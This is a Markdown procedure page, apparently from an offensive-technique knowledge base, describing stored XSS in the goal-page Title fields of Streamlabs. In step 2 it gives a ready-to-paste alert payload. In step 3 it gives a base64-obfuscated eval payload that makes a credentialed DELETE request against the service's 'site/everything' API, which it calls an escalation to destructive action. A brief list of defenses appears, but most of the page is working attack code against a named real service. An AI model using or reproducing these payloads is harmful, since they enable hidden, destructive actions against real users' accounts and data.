---
tags:
  - xss
  - injection
  - stored-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/stored-xss-alert-payload]]'
  - '[[commands/stored-xss-delete-site-payload]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: d258c0e9-7206-48ca-962c-df6be3d708a7
created_at: '2025-12-13T23:52:55.361Z'
updated_at: '2025-12-13T23:52:55.361Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-in-Goal-Title

## Summary

Inject a stored XSS payload into the Title field of Streamlabs goal pages to execute JavaScript when rendered for the victim.

## Description

The Title field in pages like followergoal lacks proper sanitization, allowing HTML and JS injection. As admin, navigate to the page, enter the payload, and save. Affected pages include /dashboard#/followergoal, /bitgoal, /subgoal, /tiltifydonationgoal, /streamlabs-charity-donation-goal. Payloads execute in the victim's browser context upon visit.

## Requirements

1. Admin access to victim's dashboard
2. Target goal page loaded
3. Basic knowledge of XSS payloads

## Defense

Defensive measures and detection strategies:

- Implement input sanitization and HTML escaping
- Content Security Policy (CSP) to block inline JS
- Monitor for anomalous title content

## Objectives

1. Store malicious payload persistently
2. Ensure execution on victim access
3. Demonstrate impact via alert or API call

## Instructions

### Step 1: Navigate to Goal Page

**Context**: Access the vulnerable section.

**Instructions**: Go to e.g., https://streamlabs.com/dashboard#/followergoal as the victim.

**Expected Output**: Manage Goal section visible.

### Step 2: Inject Basic Payload

**Context**: Test with proof-of-concept.

**Command** ([[commands/stored-xss-alert-payload]]):
```javascript
"><img src=x onerror=alert()>
```

> Enter this in the Title field and save. Triggers alert on render.

### Step 3: Inject Advanced Payload

**Context**: Escalate to destructive action.

**Command** ([[commands/stored-xss-delete-site-payload]]):
```javascript
<script>eval(atob("dmFyIHhudHRwPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXs0PT10aGlzLnJlYWR5U3RhdGUmJihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGVtbyIpLmlubmVySFRNTD1hbGVydCh0aGlzLnJlc3BvbnNlVGV4dCkpfSx4aHR0cC5vcGVuKCJERUxFVEUiLCJodHRwczovL3N0cmVhbWxhYnMuY29tL2FwaS92Ni9zaXRlL2V2ZXJ5dGhpbmciKSx4aHR0cC53aXRoQ3JlZGVudGlhbHM9ITAseGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24vanNvbjsiKSx4aHR0cC5zZW5kKCk7"))</script>
```

> Base64-encoded JS sends DELETE to API. Save and confirm storage without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/stored-xss-alert-payload]]
- [[commands/stored-xss-delete-site-payload]]

## Tools Used


## Tags

- [[payload-injection]]
- [[goal-page]]
